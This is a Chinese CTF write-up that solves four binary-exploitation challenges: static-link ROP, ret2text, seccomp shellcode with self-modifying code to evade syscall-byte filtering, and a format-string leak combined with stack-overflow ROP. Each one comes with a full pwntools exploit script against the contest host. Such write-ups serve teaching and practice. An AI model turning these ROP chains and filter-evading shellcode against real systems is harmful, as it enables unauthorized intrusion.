---
title: 【先知】奶龙杯 CTF Pwn 方向四道题目 WriteUp 汇总
source: https://xz.aliyun.com/news/92716
source_host: xz.aliyun.com
clip_date: 2026-08-21T15:04:17+08:00
trace_id: 89f618cf-bde4-498d-b059-397213c9a43a
content_hash: 595b71f2d5fb00f7b5137756ee1a295c7a63dedde49129dd35e75f2cf17437cc
status: synced
tags:
  - 先知
  - CTF
  - 漏洞分析
series: null
feed_source: 先知安全技术社区
ai_summary: 奶龙杯 Pwn 方向四道题 WriteUp，覆盖静态链接 ROP、ret2text、自修改 shellcode 绕过沙箱、格式化字符串泄露配合栈溢出 ROP 的通用解题思路。
ai_summary_style: key-points
images_status:
  total: 14
  succeeded: 14
  failed_urls: []
notion_page_id: 3c375244-d011-8122-987d-d50c71bd3e7b
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 奶龙杯 Pwn 方向四道题 WriteUp，覆盖静态链接 ROP、ret2text、自修改 shellcode 绕过沙箱、格式化字符串泄露配合栈溢出 ROP 的通用解题思路。
> 
> - **复仇奶龙已归来：** 静态链接、无 PIE，存在 256 字节缓冲区但 read 读 512，栈溢出明显；用 `pop rdi; pop rbp; ret` gadget 和内置 `"/bin/sh"`、`system` 直接 getshell；题面里的 rsync 第二阶段是干扰，`/flag` 权限 400 且 rsync 以 uid=1000 运行，普通用户无法读取。
> - **ret2text：** 开启了 Canary 和 NX，但存在后门函数 `admin_shell`，只需栈溢出覆盖返回地址跳转；本地加 ret gadget 可通，远端需直接跳 `win_addr+1`，否则栈对齐失败导致崩溃。
> - **BabySandbox：** 程序分配 RWX 内存并执行用户 shellcode，但静态扫描禁止 `\x0f\x05`，seccomp 只允许 openat/read/write/exit；用 `inc byte ptr [rip]` 将 0x0e 改成 0x0f 绕过检测，再构造 openat→read→write 的 ORW 链读取 `/flag`。
> - **ezpwn：** 利用 feedback 函数的格式化字符串漏洞泄露 Canary 和 libc 返回地址，再通过 query 函数的栈溢出构造 ROP，调用 `system("/bin/sh")`；64 位下需额外加 ret gadget 满足 16 字节栈对齐。

## WP汇总

奶龙杯，这个名字真不错哈哈哈哈  
我很喜欢。。。  
以下是我做的四道pwn题的WP，要是有那部分讲解不清或是存在知识错误的，欢迎各位师傅指正！

## 奶龙杯 - 复仇奶龙已归来(PWN)

## 1 题目概述

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fe5f9e71783ee168.png)

**不愧是复仇奶龙归来！！！！！！！**

-   题目类型：Binary Exploitation (PWN / Static Link / ROP)
-   解题关键：识别 rsync 干扰项 + 静态链接下的 ROP 链构造 + 64位栈平坦化对齐（pop rdi; pop rbp; ret）。

## 2 保护机制与程序分析

### 2.1 Checksec / 静态分析

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7cae0822ac8d6ec5.png)

对可执行文件进行分析：

-   **Arch**：amd64-64-little (x8664)
-   **Link Style**： **Statically linked** （静态链接，所有 glibc 代码已直接嵌入二进制文件）
-   **PIE**：No PIE (0x400000 固定基址)
-   **NX**：NX enabled（栈不可执行）

### 2.2 代码分析与漏洞定位

IDA 查看反编译代码：

```plain
__int64 vulnerable()
{
  _BYTE v1[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("Welcome to the archive terminal.");
  puts("Enter your access phrase:");
  read(0LL, v1, 512LL); // <--- 栈溢出漏洞点
  return puts("Access denied.");
}

void __noreturn win()
{
  if ( (unsigned int)system((__int64)"/challenge/start.sh") == -1 )
  {
    perror("system");
    exit(1);
  }
  puts("[stage 1 complete] /challenge/start.sh executed; rsync is ready on port 8731.");
  exit(0);
}
```

-   **漏洞分析**：v1 数组分配空间为 256 字节（0x100），但 read 允许读取 512 字节（0x200），存在极其明显的栈缓冲区溢出。
-   **偏移计算**：覆盖至返回地址所需的 Padding 为

```plain
256 (v1)+8 (Saved RBP)=264 字节 (0x108)256 (v1)+8 (Saved RBP)=264 字节 (0x108)
```

## 3 陷阱与干扰项排查 The "rsync" Red Herring

题目看起来设计了双阶段（Multi-Stage）：

1.  溢出跳转到 win()，运行 /challenge/start.sh 并启动 rsync 服务。
2.  通过第二个端口连接 rsync 服务，利用 rsync 提取 Flag。

### 为什么 rsync 无法拿到 Flag？

查看 start.sh 与 rsync.conf 源码：

-   start.sh 执行了：

```plain
echo -n "$INSERT_FLAG" > /flag
chown root:root /flag
chmod 400 /flag
```

-   rsync.conf 配置了：

```plain
[public]
   uid = 1000
   gid = 1000
```

**原因**：rsync 守护进程强制以普通用户（uid 1000）运行，而 /flag 被设置为 400（仅 root 可读）。哪怕利用 use chroot = no 进行路径穿越，Linux 内核也会因权限不足拒绝 uid 1000 读取文件。

> 一开始尝试第一阶段把的端口连上，然后去尝试打通  
> \[stage 1 complete\] /challenge/start.sh executed; rsync is ready on port 8731.  
> 后台的 rsync 服务已经顺畅启动，然后想着直接去远端拉flag，但试了好久，就是不成功，原来是flag的权限写死了qwq 。。。。

**突破点**：第一阶段 PWN 进程是以拥有最高权限的上下文运行的。因此直接放弃 rsync，在第一阶段构造 ROP 链获取 Shell 才是真正解法。

## 4 漏洞利用逻辑

由于程序为静态链接，程序内已嵌入完整的 glibc 符号和字符串：

1.  **字符串**：使用 strings 查找到程序中内置的 "/bin/sh" 字符串地址为 0x488599。
2.  **函数**：直接获取 system 函数符号地址为 0x405210。
3.  **Gadget 精准匹配**：  
    使用 ROPgadget 检索指令：

```plain
0x0000000000402348 : pop rdi ; pop rbp ; ret
```

### 64 位栈平坦化对齐 推导：

64 位 Linux 下调用 system 必须满足 **RSP 为 16 字节对齐**：

-   溢出 264 字节覆盖返回地址后，RSP 处于 0 mod 16 状态。
-   执行 pop rdi; pop rbp; ret Gadget 时，会连续从栈中弹出 2 个 8 字节数据（rdi 与 rbp），共弹出 16 字节。
-   执行完毕跳转到 system 瞬间，RSP **刚好天然维持 16 字节对齐**！因此无需插入额外的 ret gadget。

## 5 完整脚本

```plain
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./ret2text1')
p = remote('challenge.cyclens.tech', 30445)

pop_rdi_rbp = 0x402348
system_addr = 0x405210
bin_sh      = 0x488599

log.info(f"pop rdi ; pop rbp : {hex(pop_rdi_rbp)}")
log.info(f"system            : {hex(system_addr)}")
log.info(f"/bin/sh           : {hex(bin_sh)}")

p.recvuntil(b"Enter your access phrase:\n")

payload = b'a' * 264
payload += p64(pop_rdi_rbp)
payload += p64(bin_sh)
payload += p64(0)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

## 6 提权与获取 Flag

运行 Exploit 成功取得交互式 Shell：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3045fbdc9162bc1f.png)

## 7 总结

1.  **防范迷局**：在 CTF 中遇到复杂的多阶段（如结合 rsync/ftp 等）设计时，先检查权限链（uid vs file permissions），避免被非必要的第二阶段拖住。
2.  **静态链接技巧**：静态链接的 ELF 文件内部藏有丰富的汇编 Gadget 和字符串资源（如 "/bin/sh"），无需依赖 libc 泄露。
3.  **栈平坦化分析**：在 64 位 ROP 链编写中，必须精确计算每一个 pop 指令对 RSP 栈指针移动的影响，确保跳入 system 时满足 16 字节对齐。

## 奶龙杯 - ret2text（PWN）

## 1.题目概述

看看保护机制

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4afc99f059d82e89.png)

可以知道开了Canary，NX保护

通过IDA反汇编可以看出

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/78b4de047e19790a.png)

这里存在栈溢出，写入buf的字节数超过它的容量

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/b61ab5d3e090807a.png)

找到个后门函数

综上，这就是道ret2text！！！

## 2.脚本

直接写脚本

```plain
from pwn import *
import time

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

elf = ELF("./ret2text")
win_addr = elf.sym['admin_shell']

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

def conn():
    if args.REMOTE:
        host = "challenge.cyclens.tech"
        port = 31706
        return remote(host, port)
    else:
        return process("./ret2text")

def exploit(io):
    io.recvuntil(b"Submit your signed access token.\n")

    payload = b'b' * 56 +  p64(ret)+ p64(win_addr)

    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io = conn()
    exploit(io)
```

最开始直接用的这份脚本，发现本地能通，但是打远端发现通不了

仔细分析，看了看日志，看日志中的这一行：

```plain
[DEBUG] Received 0x17 bytes:
    b'[-] signature rejected\n'
```

这是 signin() 函数最后一行的 return puts("\[-\] signature rejected"); 打印出来的。

这说明： **Payload 已经成功写进了缓冲区，程序正常执行完 puts，准备在函数返回（执行 ret 指令）时跳转！**

挂在后面的 Got EOF while reading in interactive，说明程序在跳转到 adminshell 或执行 system("/bin/sh") 的瞬间崩溃掉了。

意思就是栈对齐的方式反了，加了ret反而打破了栈对齐，所以我们直接采用这种方式

```plain
from pwn import *
import time

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

elf = ELF("./ret2text")
win_addr = elf.sym['admin_shell']

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

def conn():
    if args.REMOTE:
        host = "challenge.cyclens.tech"
        port = 31706
        return remote(host, port)
    else:
        return process("./ret2text")

def exploit(io):
    io.recvuntil(b"Submit your signed access token.\n")

    payload = b'b' * 56 +  p64(win_addr+1)

    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io = conn()
    exploit(io)
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5cf55bbf57f5f1cf.png)

拿到flag！！！

## 奶龙杯 - BabySandbox (PWN)

## 1 题目概述

-   **题目类型**：Binary Exploitation (PWN / Shellcode / Seccomp)
-   **解题关键**：RWX 内存利用 + 自修改代码（Self-Modifying Code）绕过 syscall 静态检测 + ORW（openat->  
    read-> write）沙箱绕过。

**保护机制**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6afbc2b0b697d3a7.png)

## 2 代码与漏洞分析

反编译 main 函数核心代码如下：

```plain
buf_2 = (char *)mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL); // 分配 RWX 权限内存
...
v5 = read(0, buf, 0x100uLL); // 最多读取 256 字节 Shellcode

if ( v5 != 1 )
{
  do
  {
    if ( *buf_1 == 15 && buf_1[1] == 5 ) // 检查 0x0F 0x05 (syscall)
    {
      puts("No syscall allowed in shellcode!");
      exit(1);
    }
    ++buf_1;
  }
  while ( buf_1 != &buf[v5 - 1] );
}

puts("Applying seccomp sandbox...");
init_sandbox();
((void (*)(void))buf)(); // 跳转执行 Shellcode
```

### 关键特点分析：

1.  **RWX 权限**：mmap 的保护标记设置为 7（PROTREAD PROTWRITE PROTEXEC），即 **可读、可写、可执行**。这允许 Shellcode 在运行阶段修改自身代码数据。
2.  **静态字节过滤**：程序对输入的机器码逐字节扫描， **禁止出现连续的 \\x0f\\x05** （即 x8664 汇编中的 syscall 机器码）。
3.  **沙箱限制**：开启 seccomp 保护后直接执行 Shellcode。

## 3 沙箱分析

使用 seccomp-tools dump 获取沙箱规则：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ea50ddbed284f027.png)

```plain
0004: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0009
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

-   **结论**：

-   沙箱开启了黑名单机制，仅允许使用 **openat (257)**, **read (0)**, **write (1)**, **exit (60)**。
-   传统的 execve 和 open 被禁用，需构造 **ORW 链** 读取 /flag。

## 4 漏洞利用思路

### 1) 绕过 \\x0f\\x05 静态扫描 (自修改代码)

由于写入的内存具有可写可执行权限，我们在汇编中先写入非 syscall 字节（如.byte 0x0e, 0x05），并在该字节前插入一条指令：

```plain
inc byte ptr [rip]  ; 将紧随其后的 0x0e 加 1，变成 0x0f
.byte 0x0e, 0x05    ; 运行到此处时已被修正为 0x0f 0x05 (即 syscall)
```

这样不仅能完美通过程序的静态 \\x0f\\x05 检视，也能在 CPU 执行到该位置时恢复为正确的 syscall。

### 2) 构造 ORW 读取 Flag

依次调用三条系统调用：

1.  **openat(AT** **FDCWD, "/flag", O** **RDONLY, 0)**

-   rax = 257
-   rdi = -100 (ATFDCWD)
-   rsi = 指向 "/flag" 字符串的地址
-   rdx = 0

1.  **read(fd, rsp, 0x100)**

-   rax = 0
-   rdi = openat 返回的 fd
-   rsi = rsp (借助栈内存作为缓冲区)
-   rdx = 0x100

1.  **write(1, rsp, 0x100)**

-   rax = 1
-   rdi = 1 (stdout)
-   rsi = rsp
-   rdx = 0x100

## 5 完整脚本

```plain
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

shellcode_asm = """
#define SAFE_SYSCALL \
    inc byte ptr [rip]; \
    .byte 0x0e, 0x05

mov rax, 257
mov rdi, -100
lea rsi, [rip + flag_str]
xor rdx, rdx
xor r10, r10
SAFE_SYSCALL

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
SAFE_SYSCALL

mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
SAFE_SYSCALL

flag_str:
    .string "/flag"
"""

payload = asm(shellcode_asm)

if b'\x0f\x05' in payload:
    log.error("Payload 仍存在 0x0f 0x05，检测未通过！")
else:
    log.success("已成功绕过 0x0f 0x05 静态检测！")

# p = process('./chal')
p = remote('challenge.cyclens.tech', 30800)

p.sendlineafter(b"max 0x100 bytes): ", payload)

p.interactive()
```

拿到flag

```plain
flag{4awqcpzt-fwul-4us-8y9a-qxzfzhoay3nxx}
```

## 6 总结

1.  本题考察了在 **RWX 权限** 条件下巧妙使用 \*\*自修改代码（Self-Modifying Code）\*\*的防检测技巧。
2.  面对 seccomp 禁用 execve 和 open 的环境，灵活利用替代系统调用（如 openat）构造 **ORW** 链是解题核心。

## 奶龙杯- ezpwn(PWN)

## 1 题目概述

-   解题关键：格式化字符串漏洞（泄露 Canary & Libc） + 栈溢出漏洞（ROP 劫持控制流）

## 2 保护机制检查 Checksec

根据动态分析与反编译结果：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e6a03daee637a919.png)

-   **Canary**：开启（栈保护已启用，readfsqword(0x28u)）
-   **NX**：开启（栈不可执行）
-   **PIE**：未开启 / 固定代码段加载基址
-   **Arch**：amd64 (64-bit Linux)

## 3 漏洞分析

### 漏洞点 1：feedback() 函数中的格式化字符串漏洞

反编译代码片段：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8562eab6e110a02a.png)

```plain
unsigned __int64 feedback()
{
  char buf[40];
  ...
  read(0, buf, 0x1FuLL);
  buf[31] = 0;
  printf("Your comment: ");
  printf(buf); // <--- 格式化字符串漏洞
  return ...
}
```

**分析**：程序将用户输入的 buf 直接作为 printf 的第一个参数传入，而没有使用 printf("%s", buf)。

利用：由于输入的字节数限制在 31 字节内，无法直接构造长 Payload 进行任意写入，但足以利用 %x$p 格式化占位符泄露栈上的敏感信息（Canary 与 Libc 返回地址）。

### 漏洞点 2：query() 函数中的栈溢出漏洞

反编译代码片段：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e1f14722c0d38fb1.png)

```plain
unsigned __int64 query()
{
  char buf[40]; // 缓冲区大小为 40 字节 (0x28)
  ...
  read(0, buf, 0x100uLL); // <--- 栈溢出漏洞
  ...
}
```

-   **分析**：buf 的实际分配空间仅为 40（0x28）字节，但 read 允许读取最大 256（0x100）字节，存在非常明显的栈溢出漏洞。
-   **利用**：在已知 Canary 的前提下，可通过溢出填充 Canary，进而覆盖 Saved RBP 与返回地址，构造 ROP 链调用 system("/bin/sh")。

## 4 漏洞利用思路 Exploit Strategy

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fb3fe82be5c21ccc.png)

1.  **确定格式化字符串偏移**：

-   输入 AAAA.%p.%p... 在 GDB 中调试，确定输入缓冲区的起始偏移为 **%6$p**。
-   计算栈结构：buf 占 40 字节（5 个 8 字节单元），故 Canary 位于 **%11$p** （6 + 5）。
-   继续定位栈深处的 Libc 返回地址，确定其位于 **%17$p**。

1.  **泄露内存地址与计算 Libc 基址**：

```plain
libc_base=libc_leak−0x2a1calibc_base=libc_leak−0x2a1ca
```

-   运行 Option 1 (feedback)，发送 Payload %11$p.%17$p。
-   解析输出得到 Canary 以及 Libc Leak 地址。
-   通过 GDB 的 vmmap 计算得出相对偏移：

1.  **构造 ROP 链 Getshell**：

-   运行 Option 2 (query)，构造栈溢出 Payload：

-   Padding（40 字节 A）
-   Canary（8 字节泄露出的正确值）
-   Saved RBP（8 字节 B）
-   ret gadget（8 字节，用于 64 位 Ubuntu 的 16 字节栈平坦化对齐）
-   pop rdi; ret + "/bin/sh" 地址 + system 地址

-   发送 Payload，劫持控制流成功获取 Shell。

## 5 完整脚本

```plain
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

host = 'challenge.cyclens.tech'
port = 30554
p = remote(host, port)

p.sendlineafter(b"> ", b"1")

payload_leak = b"%11$p.%17$p"
p.sendlineafter(b"Leave a comment: ", payload_leak)

p.recvuntil(b"Your comment: ")
leak_data = p.recvline().strip().split(b".")

canary = int(leak_data[0], 16)
libc_leak = int(leak_data[1], 16)

log.success(f"Leaked Canary    : {hex(canary)}")
log.success(f"Leaked Libc Leak : {hex(libc_leak)}")
libc.address = libc_leak - 0x2a1ca
log.success(f"Libc Base Address: {hex(libc.address)}")

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

log.info(f"pop rdi : {hex(pop_rdi)}")
log.info(f"system  : {hex(system_addr)}")
log.info(f"/bin/sh : {hex(bin_sh_addr)}")

p.sendlineafter(b"> ", b"2")

payload_bof = b"A" * 40
payload_bof += p64(canary)
payload_bof += b"B" * 8

payload_bof += p64(ret_gadget)
payload_bof += p64(pop_rdi)
payload_bof += p64(bin_sh_addr)
payload_bof += p64(system_addr)

p.sendlineafter(b"Enter query: ", payload_bof)

p.interactive()
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6871112297da7902.png)

## 6 总结

本题是一道非常经典的 \*\*"格式化字符串信息泄露 + 栈溢出 ROP"\*\*组合题。

-   关键点在于先利用短小无污染的格式化字符串泄露出动态保护机制（Canary 和 ASLR 中的 Libc 地址）。
-   在构造 64 位 ROP 链时，注意 Ubuntu 系统下 glibc system 调用时的 **16 字节栈对齐要求** （通过额外添加 ret 指令解决）。

到这里就结束啦！！
